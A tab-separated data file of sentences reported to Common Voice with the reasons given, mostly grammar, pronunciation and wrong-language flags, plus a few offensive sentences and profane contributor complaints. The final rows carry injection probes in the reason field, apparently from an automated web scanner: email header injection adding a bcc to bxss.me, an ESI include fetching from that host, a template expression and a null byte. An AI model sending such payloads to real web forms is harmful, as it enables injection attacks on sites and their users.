sentence	sentence_id	locale	reason
I really do like green jeans though	06718d0ae3989458a08c83551cb62d259c2f820204e3fb5fd262ffd25959d772	en	issue with the sign and grammatically errors 
I do not want do dance with a boy at school. I'm lesbian!	08e55112750e014c088ffedbec5c76c04e558b4724b3202cb55cb0c45195efc3	en	grammar-or-spelling
כשר	0b51abc9198ba1c5b041e412945be2d9ae7c79d2f6ae66d93aa6f5efaf23c29e	en	grammar-or-spelling
Many business were destroyed.	db2ddc7ab58bad4ef75764893df9acb505487e5aaff71009cdb933e8a3961abd	en	grammar-or-spelling
دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔
	079236c002c39faa61699198f00c77b829ff3f0e8b776806f7b82c7f42f7edd4	en	sc-different-language
. اپنے ارمغان کو پیش کریں۔
	093cbcc7b717c6a373c6f49c97c6866c260ae988b9a07906f0dd1723eac3d183	en	sc-different-language
میں نے کتاب پڑھی.
	097406d48f089036a03c3557cfe93e6a4921f9d82b7e0054e2bf380815c5d6be	en	sc-different-language
 زندگی کے تمام لحاظ سے فیصلے کو دھیان سے کریں۔
	0c9ed99ece1a05556eea55f143d8236fe35b94325a20c011f171453b7acd27d2	en	sc-different-language
وہ خواب دیکھ رہا ہے.
	0cd094e193d74597b4eb76f939fe5c66616e2d54a9c8c57d6052c8551020d8db	en	sc-different-language
سچائی کو پسند کرو.
	bf35e5a0f5316c39dbfae583888be2e082772c6cf3f06b070c8abb857bd08089	en	sc-different-language
Neuner was born in Munich.	db9ab80e15ab2f6cd103cc8da39000f9477704eefca38d909b390c387de424ee	en	difficult-pronounce
After his win in France Anthony Van Dyck was sent to race in Australia.	db7d5f14ad99151b625800072d8dff51576d67eb23145cc1122f0f2c831aac46	en	grammar-or-spelling
Allmusic critic John Bush calls "Standing in the Shadows of Love" "dramatic" and "impassioned.	dbae347cfd0f2bec2aaa40b66fb290c9da2f6397b36301091437d84380ea4fec	en	grammar-or-spelling
شفقت کا رویہ رکھیں۔

	0140579e3b61939ca98958dc6f6013a15fc6a8cb8dd51f8cb32e98046d39a940	en	different-language
Formidable was torpedoed, the first major U-boat loss of World War One.	dbbdd3acc24ab95099fbcf8a3fe2f81777890fcbb99afb3a4075a6d9fe066e3e	en	grammar-or-spelling
اس کی قیمت کیا ہے؟
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
He reported effect not just on visual areas but on the whole cortex.	dbb63ebbc644b92cc6fb72c33112ddaf9787ec4f94e52726b4dc0d7e879dc477	en	grammar-or-spelling
Bom Sucesso Vol.	db9a32bbc41214afc3c985f071e1bacf2cbf30588aa56a4c102f367341997bf1	en	grammar-or-spelling
The Berlin U-Bahn is the most extensive underground network in Germany.	dbb3d3482257070738a1d31373a6152c066c908cccc1b02810b97ec1264d7c19	en	grammar-or-spelling
The Berlin U-Bahn is the most extensive underground network in Germany.	dbb3d3482257070738a1d31373a6152c066c908cccc1b02810b97ec1264d7c19	en	Untergrundbahn
شفقت کا رویہ رکھیں۔

	0140579e3b61939ca98958dc6f6013a15fc6a8cb8dd51f8cb32e98046d39a940	en	different-language
تو نے کہا تو جی اٹھے تو نے کہا تو مر گئےـ
	095e6fa316aefa10137644417b35911be46c15576236b904f37add0d56883ccb	en	different-language
شفقت کا رویہ رکھیں۔

	0140579e3b61939ca98958dc6f6013a15fc6a8cb8dd51f8cb32e98046d39a940	en	different-language
Mister Nehru was the maker of modern India.	dbda3cd4a75eb62a07822493f29fa056e66cc80d3cf741c32a20d266b251d946	en	grammar-or-spelling
دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔
	079236c002c39faa61699198f00c77b829ff3f0e8b776806f7b82c7f42f7edd4	en	sc-different-language
His father name was Shiekh Adam.	dbe6839ecd10b93c8619a99efe8bc11e614ff99bae2a0ff1b4b26f5589225359	en	grammar-or-spelling
اس کی قیمت کیا ہے؟
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
اس کی قیمت کیا ہے؟
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
It would be one of the most intense tremor ever felt in the region.	dc018366fa93ff2c7b6e08156cfe2a0573ddad288edc2b7845006082e2194267	en	grammar-or-spelling
WiFi service in the harbour is offered through Internet Cafe-Clifton.	dbfbc7fe6ec9e2b3f5dd66e0ecb0044fb479ba1171b501dcce7eeae0fae5c29d	en	grammar-or-spelling
اس کی قیمت کیا ہے؟
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
The town's current administration is introducing urbanization plan for the municipality.	dc1cd87386200e0b97843963e6850130f58c38d86f337469f60ded9ac69c19e6	en	grammar-or-spelling
A poster was made for visualisation.	dc061710cfdc7cef4c67e390252fefdfdf423cd11cd8cbce8e6555ea9fc7accd	en	grammar-or-spelling
She was their eight child.	dc226abb9c6cba0be4db3638214940a0902194a72b8a21880b9caea6e8439197	en	grammar-or-spelling
It would mean, then, the city of Fufluns.	dc313391da11e6d87aa23123a1dc822cb595b38253ac740f7189f7a260f34fe1	en	grammar-or-spelling
اس کی قیمت کیا ہے؟
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
اس کی قیمت کیا ہے؟
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
That and the later "Himatsuri" were based on novels by Kenji Nakagami.	dc518e7bb351afa4f1d692827610f5ca1e6a78fa72282abea8ef41f924d8a7fe	en	difficult-pronounce
Moreover, in his Damit wir nicht vergessen!	dbfd6b96dc4e8299ee4e203f5106c848bc78ff414338be8de0f217d50169faad	en	different-language
 اس مسئلے پر سوچو.
	39a7aac114bfc4edce92a85ab65e54278cabca8a164f522bbc8759ee45ed8821	en	sc-different-language
. دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔
	3a1c457cc264120ea3690bf327da819a81e29efbaf853ff743b16d6724be1eff	en	sc-different-language
. انصاف اور ایمانداری کو پسند کریں۔	3be60ea5efc300b68b75ca5ac0a0efda255ff837b1f4961f4cf0aad8efb60f19	en	sc-different-language
اللہ سب کا مالک ھےـ	3c155a21c69d61e303b49298fd5ee7e4d36b50ab5e5611d0a50a7d54ac63cfe5	en	sc-different-language
. کامیابی کی طرف قدم بڑھائیں اور مقصد تک پہنچیں۔
	3d348ab011bdd49c7d0b5026a829973a40d3d7b1bbe4668d5aab08b932221e29	en	sc-different-language
. پیار سے سب کچھ سمجھائیں اور راحت کریں۔
	3dc630917100c9c9bc5b3a79ce26d4c383e3505a49d343a4cf7f7185edf0bd98	en	sc-different-language
. کامیابی کی راہوں پر اقدام بڑھائیں۔
	3fc7d046dc319a32aa3fc5be9a0df943fc3b064efbbb8b716b6160454368c739	en	sc-different-language
. کوشش کریں کہ زندگی کو بہتر بنائیں۔
	4016a42dc845ec1a3f7e39e0d25afd09f47006b3611cfa3cb74cb43717a03e4c	en	sc-different-language
 دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔
	41540e6ee0bcd0717dfbed0f3c40dfcbacb87c7b11082d5f0d2b9f31b1f3dada	en	sc-different-language
. محبت اور مودت کو ترجیح دیں۔
	4199f08dd3477e899f5401a28dead3efabc3209380818395362e473bb54ad14b	en	sc-different-language
میرے پاس بات کرنے کو بہت کچھ ہے۔	43bb1b578c0f513f3f7b291dfe0a11d71a7c96c9559fe86034f8d72e90210a14	en	sc-different-language
پانی پی لو، پیاس لگی ہوئی ہے.
	44e60d23d9236145215b43a079676c527dfeef269508851d241bfcfbe825fd06	en	sc-different-language
بچوں کے کتابیچے ہیں.
	465dd515cb9b117dd53e5fd7647b1f76d24a3b98d4ce098aa7655ad539f22d51	en	sc-different-language
. زندگی کو خوشیاں بڑھانے کی کوشش کریں اور دنیا کی سیر کریں۔
	471f8ca1917beb9bbef4369c0f867f9706b46ed4f6b793b1a0eba723e233d40b	en	sc-different-language
میری ماں کھانا بناتی ہیں.
 	4774c547cc8a5ff76c66110b822c29a050f076845cc1bcee2d555fd151a19a2f	en	sc-different-language

 آجکل ہر انسان مشکلات کا آخری حل خودکشی سمجتا ہےـ 	47a43d579e05b64ea9126b0b8732ea6e5fbb68d3e2c2e83b5b533f776c6bff92	en	sc-different-language
وہ کام کر رہا ہے.
 	483a7d41ebbf2e60f3620337e633e836a84aa04613550d0911d9c8db54876eec	en	sc-different-language
زندگی کو خوشیاں بڑھانے کی کوشش کریں اور دنیا کی سیر کریں۔	487f4840f2439d3a8ba692349de07260bd71a6725b8079ecea871911cabddbfb	en	sc-different-language
میں اپنے دوست کے ساتھ ہوں.
	48b46aa694055632dcdf7039598ab6768a3ac209ac48bf3cba8179b367c7dae7	en	sc-different-language
یہ کوئی مذاق نہیں ہے۔	4939eb9343d777e17727098710fbee6ae354ab6f405ececc513ab6b943c8ba51	en	sc-different-language
I'm jest so proud to be here!	dc5bf09156e83e36436afee4480263fdb9e4e4b8dc74826a679231f5edf3a399	en	grammar-or-spelling
टूटी हुई क्रेयन

	9f11ae4ada1b1dc787c2809e9318a10175e192ddb5fadf9b43bb4ecda0730d71	en	sc-different-language
टूटी हुई क्रेयन

	9f11ae4ada1b1dc787c2809e9318a10175e192ddb5fadf9b43bb4ecda0730d71	en	???what???
ขอภาษาไทย	f5e683bcd2b7c94adc021dac1551b9d85a4f08fc795230f97cb969197baa2bf2	en	sc-different-language
Moreover, in his Damit wir nicht vergessen!	dbfd6b96dc4e8299ee4e203f5106c848bc78ff414338be8de0f217d50169faad	en	grammar-or-spelling
He is also an ambassador for the for seriously ill children.	dc9be530e9f970d519210d8d375353b774554b3f3bc0d701fa68c860272bfa5c	en	grammar-or-spelling
The Judenrat had to supply the Germans forced labor.	dc76741b1445827f1e6bcc71ca58594bdeedcc5ea370550c6b195a6505ce9540	en	difficult-pronounce
Shimizu's station name is called Tokachi Shimizu.	dc4fa4b6aaaf434335b21b8448dbc1cf0dbf0ba1f577cd3be23d2c5a7100d88a	en	difficult-pronounce
Hayden discovers Mezner with the Technocyte transmitter, a Hydra-like monstrosity.	dc9d0d86f671bed9199bdbc6191b23b7feb914b932dd8b77b9f4fdbb343b01f1	en	difficult-pronounce
They frequently harbor amplified oncogenes and genes involved in drug resistance.	dc9c69906311e1a7b6c71021c5495d4684d3e3b44d5b690cd89cab7a84146fb3	en	difficult-pronounce
Many steep, narrow slot canyons popular with technical canyoneers are found in Robbers Roost.	dc9d9606e4da62ecbbff850b0d40557a210a749c85f812a88b774492f0f0ceec	en	difficult-pronounce
Have you seen my condoms? I am about to fuck a hooker.	04a7aa99b844ecc99be6ce09d7714c57a0b4afd7c813da225fc537ed986c35ec	en	offensive-language
I really hate native americans, they are big stinky.	3a43e75b75f7830d1af68b7c735a4f3193971b2688f5b801afe710da0171ac2a	en	offensive-language
. پیار سے سب کچھ سمجھائیں اور راحت کریں۔
	3dc630917100c9c9bc5b3a79ce26d4c383e3505a49d343a4cf7f7185edf0bd98	en	sc-different-language
. کامیابی کی راہوں پر اقدام بڑھائیں۔
	3fc7d046dc319a32aa3fc5be9a0df943fc3b064efbbb8b716b6160454368c739	en	sc-different-language
. کوشش کریں کہ زندگی کو بہتر بنائیں۔
	4016a42dc845ec1a3f7e39e0d25afd09f47006b3611cfa3cb74cb43717a03e4c	en	sc-different-language
 دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔
	41540e6ee0bcd0717dfbed0f3c40dfcbacb87c7b11082d5f0d2b9f31b1f3dada	en	sc-different-language
. محبت اور مودت کو ترجیح دیں۔
	4199f08dd3477e899f5401a28dead3efabc3209380818395362e473bb54ad14b	en	sc-different-language
میرے پاس بات کرنے کو بہت کچھ ہے۔	43bb1b578c0f513f3f7b291dfe0a11d71a7c96c9559fe86034f8d72e90210a14	en	sc-different-language
پانی پی لو، پیاس لگی ہوئی ہے.
	44e60d23d9236145215b43a079676c527dfeef269508851d241bfcfbe825fd06	en	sc-different-language
بچوں کے کتابیچے ہیں.
	465dd515cb9b117dd53e5fd7647b1f76d24a3b98d4ce098aa7655ad539f22d51	en	sc-different-language
. زندگی کو خوشیاں بڑھانے کی کوشش کریں اور دنیا کی سیر کریں۔
	471f8ca1917beb9bbef4369c0f867f9706b46ed4f6b793b1a0eba723e233d40b	en	sc-different-language
damn, I'm running out of ideas for sentences	47641a482edab7411796c9b6095971053b0b0269582d7294cc30cc55d03a065e	en	grammar-or-spelling
میری ماں کھانا بناتی ہیں.
 	4774c547cc8a5ff76c66110b822c29a050f076845cc1bcee2d555fd151a19a2f	en	sc-different-language

 آجکل ہر انسان مشکلات کا آخری حل خودکشی سمجتا ہےـ 	47a43d579e05b64ea9126b0b8732ea6e5fbb68d3e2c2e83b5b533f776c6bff92	en	sc-different-language
وہ کام کر رہا ہے.
 	483a7d41ebbf2e60f3620337e633e836a84aa04613550d0911d9c8db54876eec	en	sc-different-language
زندگی کو خوشیاں بڑھانے کی کوشش کریں اور دنیا کی سیر کریں۔	487f4840f2439d3a8ba692349de07260bd71a6725b8079ecea871911cabddbfb	en	sc-different-language
میں اپنے دوست کے ساتھ ہوں.
	48b46aa694055632dcdf7039598ab6768a3ac209ac48bf3cba8179b367c7dae7	en	sc-different-language
یہ کوئی مذاق نہیں ہے۔	4939eb9343d777e17727098710fbee6ae354ab6f405ececc513ab6b943c8ba51	en	sc-different-language
The mischievous mongoose merrily meandered amid the tangled thicket, tantalizingly taunting the perplexed porcupine.	4944159ef1acdbc171d753c2bcb69563fd05a61e2d52bcfdead79ae686b9710e	en	difficult-pronounce
. زندگی کے تمام لحاظ سے فیصلے کو دھیان سے کریں۔
	4a3366e8d3af24767c930fcfc18cac8fa37a9f3c7c7b66f64dad1d102c032642	en	difficult-pronounce
. صدقہ دینے کی اہمیت کو سمجھیں اور دعائیں کریں۔

	4a3f90cbba5d60a1117db18e9cc21dd73fafbe449cbe6a7af12055ef39f36c9a	en	difficult-pronounce
Das Wetter morgen wird heiter bis wolkig.	4adf36570c33d12d4cdcecfc6e40b3fe96795e1a5bb8958ceb9491acd558f612	en	sc-different-language
. اپنی تعلیم اور دانائی کی قدر کریں۔	4b0f1382fb9fdc7b2a5fc7359371d5a19692cb3b06cfbb284d5e5206c89a4be2	en	sc-different-language
It was in Guadalajara where Cobbs found boxing.	dc873e96abd298dad5072c3548056b48b81c3cf2aecd77413f1b5cecee86077b	en	difficult-pronounce
He also worked on the systematics of ichneumonid and chalcid wasps.	dcbb168a9116706eeb9c368706167c0a0bc3f3a2765a9d62f9bcb7e53b92b748	en	difficult-pronounce
Her autobiography "Sandhya Rater Shefali" (Shefali of the Evenings and Nights) was published recently.	dcb30168edfdf5830d1aae7f7abd73370e647e2da07c5b569f89d70bb998c13e	en	difficult-pronounce
He is also an ambassador for the for seriously ill children.	dc9be530e9f970d519210d8d375353b774554b3f3bc0d701fa68c860272bfa5c	en	grammar-or-spelling
The recording was produced by Motsieloa at the Gallo Recording Studios, in Johannesburg.	dc93e50dfb88a5c0844b0e1e5782ce0a566daf8d982915cfb8baeaff10315812	en	difficult-pronounce
Tongue twisters don't help Common Voice. Recordings need to sound natural.	09e87742e133047cd6213460c1f7b578668e24c5b3fe0b0c2441074f86057ade	en	grammar-or-spelling
Tongue twisters don't help Common Voice. Recordings need to sound natural.	09e87742e133047cd6213460c1f7b578668e24c5b3fe0b0c2441074f86057ade	en	2 sentences
 Open your web browser and type in “sim.report” in the address bar
	3f5878e3525890e2e9530a53e9b618ca03921508f0c6da759a77edc8b5b8ddea	en	grammar-or-spelling
 Open your web browser and type in “sim.report” in the address bar
	3f5878e3525890e2e9530a53e9b618ca03921508f0c6da759a77edc8b5b8ddea	en	.
"The Portland Mercury"'s current editorial staff consists of Editor-in-Chief Wm.	dcd5879cd26410934840cc3b8fdf1f42fcd9af12531b053f812ffd327d9c909d	en	grammar-or-spelling
Sawaki was then was adopted by an aunt whose husband soon died.	dc853b78e9523f8b0df82c93df0e49604d6c077e10a245bac131801dcfd393d7	en	grammar-or-spelling
It took eleven hours and fifty-five minutes to orbit its larger parent asteroid	efdcb797b6116e7d252cc65d5d9da7926e754317ac5b4094ca1d87d3a41c2142	en	grammar-or-spelling
It took eleven hours and fifty-five minutes to orbit its larger parent asteroid	efdcb797b6116e7d252cc65d5d9da7926e754317ac5b4094ca1d87d3a41c2142	en	.
Nimepika chakula kitamu.	3ab62b095a69f7d1a2a1180973fe2991b18c40a4b86b46b1a5a5ed3d5563a090	en	sc-different-language
Nimepika chakula kitamu.	3ab62b095a69f7d1a2a1180973fe2991b18c40a4b86b46b1a5a5ed3d5563a090	en	wot?
Watoto wanacheza mpira.	f35c4954a1dc49037a3373c3686141b2ad2c6f9080cba6ff07633c41fe53040d	en	sc-different-language
The use pattern mirrors that of the Royal Navy, and has since formation.	dce9b0eb54b0690da150600512bb8de41394db82f0055939042e77d782e3c32f	en	grammar-or-spelling
While at Warners Young was featured prominently in the Joe McDoakes comedy shorts.	dcc60934f7d41f485d240cc2a47b6477f41f7c57c2143b1b487eafc093895407	en	grammar-or-spelling
Moreover, in his Damit wir nicht vergessen!	dbfd6b96dc4e8299ee4e203f5106c848bc78ff414338be8de0f217d50169faad	en	different-language
The chicken was big	a78b647c8d2b023aad4cd1782c5a92e8fb61809e8b9ed55d997097e963103459	en	grammar-or-spelling
The chicken was big	a78b647c8d2b023aad4cd1782c5a92e8fb61809e8b9ed55d997097e963103459	en	.
Innovate  Educate Succeed	ff31f743ebccc900eed0d37d568571a573f5f3c22bd55439a5d61376e059471a	en	grammar-or-spelling
Innovate  Educate Succeed	ff31f743ebccc900eed0d37d568571a573f5f3c22bd55439a5d61376e059471a	en	.
কিছু বলেন না লিলি 	1b8bf66f89dc3d17711021984d91559fc3793816382c1cab5051a80b7289e65c	en	sc-different-language
কিছু বলেন না লিলি 	1b8bf66f89dc3d17711021984d91559fc3793816382c1cab5051a80b7289e65c	en	Wot/!
In conjunction with orbicularis contraction, the mentalis muscle allows the lips to pout.	dd0725056115765710b1d403de24c670f837469d05536d167275a0c26ffd59ca	en	offensive-language
In conjunction with orbicularis contraction, the mentalis muscle allows the lips to pout.	dd0725056115765710b1d403de24c670f837469d05536d167275a0c26ffd59ca	en	grammar-or-spelling
In conjunction with orbicularis contraction, the mentalis muscle allows the lips to pout.	dd0725056115765710b1d403de24c670f837469d05536d167275a0c26ffd59ca	en	different-language
In conjunction with orbicularis contraction, the mentalis muscle allows the lips to pout.	dd0725056115765710b1d403de24c670f837469d05536d167275a0c26ffd59ca	en	difficult-pronounce
In conjunction with orbicularis contraction, the mentalis muscle allows the lips to pout.	dd0725056115765710b1d403de24c670f837469d05536d167275a0c26ffd59ca	en	KEENELAND ASSOCIATION INC. 4201 VERSAILLES RD. LEXINGTON,KY 40510 KEENELAND KIDS CLUB.GOV
Variant Chess games are often played on public chess servers or chess forums.	dd0521f9251ceebe6e0a435b1900a0a65b3be55f076dd138336e6df387c98689	en	cv voice 
It is managed by the dps society.	dceef9c0092a4661e0f7f691bd52a63dcf918a59d564cbd77c4fa7f0cbf42dea	en	grammar-or-spelling
The first postulator for the cause was Fr.	dd0c03cf256be4f0648eb362038d44fd4e368b5c7203e4653491d591fc068533	en	grammar-or-spelling
Her book Fat!So?	dce3f9e488ea1d6192bb5702449f2bb10305d78ab5a616e37e391ad695d4a7c6	en	grammar-or-spelling
Moreover, in his Damit wir nicht vergessen!	dbfd6b96dc4e8299ee4e203f5106c848bc78ff414338be8de0f217d50169faad	en	different-language
Her doctoral research used historical and ethnographic methodologies to study San Francisco taxi workers.	dd2472faa8d1c38777e70076075c47ff20309ed5c3672fb6f70b75c9b93b153a	en	difficult-pronounce
I studied at Karatina University	72053465341f5ee631da2cbadfd6a0ddf5a9bed704604f0af5f3454359be2200	en	.
Admiral Togo Heihachiro was commander-in-chief of Combined Fleet during the Russo-Japanese War.	dd0e91e8f05689edcaf3e2a150a33db01175ab91692ced1a9c65fb8e70a486a0	en	difficult-pronounce
Passenger services are provided by Abellio ScotRail on behalf of Strathclyde Partnership for Transport.	dd79edb939ff36e9d7c59bf207dea2cb404f41649bf3f72466d381d810ea984d	en	Why do you allow sentences that are too long to read in your time-limit?
The disruption of this circadian rhythm can cause hormone imbalance in all living organisms.	dd5cced2d98fe077cd6488af3f4d46107c1555b373869055181e5b94b4a031f3	en	difficult-pronounce
কেমন আছেন সবাই? আশা করি ভালো আছেন।	1b5c5928c880b3b958ae8d8f2e76a4f4dc87d21a862a0bf6efecc1ffa206608a	en	sc-different-language
কেমন আছেন সবাই?	23d73ee4c6a33d1db165693df4817dab5b3c623bd8c1dcea7c440759f7907bc1	en	sc-different-language
Swaying is seen also in some insects, like Macleay's Spectre stick insect, "Extatosoma tiaratum".	dd8904db3f15427bd8046a47722059630fdd8c489707a6e475e1b3dff2845568	en	difficult-pronounce
Swaying is seen also in some insects, like Macleay's Spectre stick insect, "Extatosoma tiaratum".	dd8904db3f15427bd8046a47722059630fdd8c489707a6e475e1b3dff2845568	en	Machine learning is the goal. Not proving how totally Hipster and intellectual you are. Why do you guys tolerate these tongue twister sentences?
We now indicate subdivisions of three by modifying note values with dots or triplets.	ddb4f16f6464b50dd0588bb32fcddbb8f5e581b5bf5f1a5dc3884e13312eac1a	en	different-language
Today is a cold autumn day	e197cea48136ad2afc004dcff5768395a69cd04ae6b501417b512bb33efa2d65	en	.
Similar to the Japanese onigiri, variations on the traditional Spam musubi exist.	ddac395a6e90bda14a892db92bd0faa21f393fefa721afdfe6978a8e052b21ad	en	difficult-pronounce
Similar to the Japanese onigiri, variations on the traditional Spam musubi exist.	ddac395a6e90bda14a892db92bd0faa21f393fefa721afdfe6978a8e052b21ad	en	Stop approving sentences like this. It's trolls trying to write tongue-twisters and polygots trying to show off how multilingual they are. It's not beneficial to machine learning to have recordings of people struggling to pronounce difficult words.
The name is more common is Mexico than in its country of origin.	ddcbbad4f26770e6643605a568dcf9b4f24b61a3542590bd0907b149ca10a4e2	en	difficult-pronounce
Antimycotic imidazole derivative.	ddcffd1e8d9e18e6347ea1647d80afa92b075d9c5acf638ce1ccc7177d97eed8	en	difficult-pronounce
All were artists, and MacDonald was one of the famous Canadian Group of Seven.	ddd758ddb80e0476587f0d84beb383e0e32d6f881d3d748b74aeaba5f686ab88	en	difficult-pronounce
All were artists, and MacDonald was one of the famous Canadian Group of Seven.	ddd758ddb80e0476587f0d84beb383e0e32d6f881d3d748b74aeaba5f686ab88	en	"Ohhhh look how clever I am putting overly complicated words in the sentences I submit! Machine Learning definitely benefits from listening to people struggle to pronounce words I put in to show off how smart I am!"
Solitary flowers end long stalks with a pair of bracteoles.	dde2f69ceb50d8fa15264ed343b05e77323b47deef8c790e719f3bebdcde052c	en	difficult-pronounce
Riberinha, in Portuguese, literally means small "ribeira", or small river-valley owing to its location.	ddb2962c582abeb498c609a5b8c2758242647729829e1ef3e2b78d34ecfe1722	en	difficult-pronounce
The Giffards were Catholics and the most important Recusants in the area.	ddb998e120d809e56366d32a2ffd92594c5177bab5a07e3b0f38a5d7a95fb2ab	en	difficult-pronounce
The Giffards were Catholics and the most important Recusants in the area.	ddb998e120d809e56366d32a2ffd92594c5177bab5a07e3b0f38a5d7a95fb2ab	en	Seriously. Fuck off with these difficult to pronounce sentences. It doesn't fucking benefit Common Voice. All it achieves is making the person who wrote it look like a pretentious, self-important dick.
Woelfl's works have long disappeared from the concert repertory.	dddcbc3d32365802c8c3c2a5c30666813b34b4ed60129f18a8cd145468bd945a	en	difficult-pronounce
Anthopoulos was eventually made the permanent general manager for the Jays.	ddd7c6be7a25d7d9a153b020fc3374814c054444a1a3628a2da2f572f53e6aee	en	difficult-pronounce
Boris Izaguirre also worked as screenwriter.	ddcda949569f4199aa68dd157f97a00f9205ecfab9c22fa88eb58dcba5194f5d	en	difficult-pronounce
در حال بارگزاری	06fc1239d523f2973dac2f4d6c494ba91c034fae06735a008c6f8e1318c1a9eb	en	sc-different-language
Parts of the municipality are Grafenschachen and Kroisegg.	dddbebd92e1964fa3ea83fc185e1396578412f5e17c2f6209c0987a52778cf16	en	difficult-pronounce
The book chronicles the bloody coups and uprisings in the post-independence Bangladesh.	de10ac8bfe15edcf4bb61ae09d3f2871f4b6651533ccfad3c65c9265aa5026e9	en	grammar-or-spelling
The Carabinieri provide military police services to all the Italian armed force.	de1e34ac09279bf1118a3d7ca86c605877987c4c6bb44bfc2da06ccc8d1551b6	en	grammar-or-spelling
After the smaller masquerades performance the bigger masquerades comes out to continue the show.	de159a4450b7eabadb057066643080c553d665077c901fddb404599a9d926132	en	grammar-or-spelling
Express trains operate from Yongsan and Seoul Stations to Dongincheon and Cheonan stations.	de186ac2ae78e8c1e80fbfb7e8648b8370c294ed3e47e69d0f3033a819f9b93f	en	difficult-pronounce
Baia Domizia is the brand-new small resort town of the comune of Sessa Aurunca.	de0bfa1cf56965d8af764f56cbd20fd5910e78e449f1e0f986bac98be9eac327	en	difficult-pronounce
Vikas Kumar has two sons kunwar Siddhant kumar and kunwar Vedansh kumar.	de189095fabb8d4cff60b6476e0d9dea87878401a17dc73bf60997e338efc1e9	en	difficult-pronounce
His father, George Plater, served Maryland in the Continental Congress and governor.	de0cd4f1cc2e23df130a10ce4fca56ead1e6bb51d84493f968844837d3f12227	en	grammar-or-spelling
The game's use of new model sets were also showcased.	de22cf027c44a1cc49ad99a3c39bb7f628a83b45f52272f4a98d6b4ee978e131	en	grammar-or-spelling
Pasion had two sons with his wife Archippe: Apollodorus and Pasikles.	de071726b459ad375fa9f801d3a1488e88df1d7735c8a139aaafcd931810e125	en	difficult-pronounce
These offstage incidents are the only contributions made by the Psammead to this story.	de01fe7f4e331ab4f05467dd3377b7909b548ae24aa35da1a4b0cbda169e32b1	en	difficult-pronounce
Keris bahari is dubbed by European people as "Sumatran rapier kris" or "execution keris".	de0bff77c0b27be0ff47af98906d5dff70abd95329e97c40a21e7b441fb9b00d	en	difficult-pronounce
Riberinha, in Portuguese, literally means small "ribeira", or small river-valley owing to its location.	ddb2962c582abeb498c609a5b8c2758242647729829e1ef3e2b78d34ecfe1722	en	difficult-pronounce
Acanthite is the only stable form in normal air temperature.	de29b29d5123454c05dac39ba7c4110fdec68fbc5daf938059ef6fab44052f4b	en	difficult-pronounce
Logvani and Olsufyevo are the nearest rural localities.	de11809e8c2f0681e88169bd1be22ebd00cf27e0b72323ca47503e6a4058ff87	en	difficult-pronounce
The Village of Sturtevant is governed by a six-member board and a village president.	de3597ac7c86a50e3c547e2067ac73b6089862f7af7430882407232a1a91f0ce	en	difficult-pronounce
Piskunov.	de3465c11a6ca5b24c334cab0cf20de9e899cfd832815b1cf7037cf03c78ae7a	en	difficult-pronounce
Piskunov.	de3465c11a6ca5b24c334cab0cf20de9e899cfd832815b1cf7037cf03c78ae7a	en	different-language
Riberinha, in Portuguese, literally means small "ribeira", or small river-valley owing to its location.	ddb2962c582abeb498c609a5b8c2758242647729829e1ef3e2b78d34ecfe1722	en	different-language
The Sipicate-Naranjo National Park is located east of the town.	de427382f1de051329a54a058f1ef258faeb59754ee86b9b508817c2967b9d04	en	difficult-pronounce
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1F7gqxO
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	OcuUAWvx
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language%00
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language%0abcc:009365.354-1594.354.a4363.19651.2@bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	to@example.com>%0d%0abcc:009365.354-1595.354.a4363.19651.2@bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language<esi:include src="http://bxss.me/rpb.png"/>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${10000253+9999027}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language&n947116=v951406
